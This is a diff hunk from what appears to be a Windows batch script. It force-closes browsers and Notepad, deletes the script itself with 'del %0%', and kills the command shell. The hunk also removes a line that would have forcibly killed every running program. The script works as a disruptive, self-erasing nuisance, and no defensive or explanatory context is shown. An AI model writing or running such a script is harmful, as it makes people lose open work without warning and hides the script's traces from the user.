@@ -107,7 +107,6 @@ taskkill /f /im firefox.exe
 taskkill /f /im brave.exe
 taskkill /f /im google.exe
 taskkill /f /im notepad.exe
-taskkill /f /im *.exe
 start explorer.exe
 del %0%
 taskkill /f /im cmd.exe
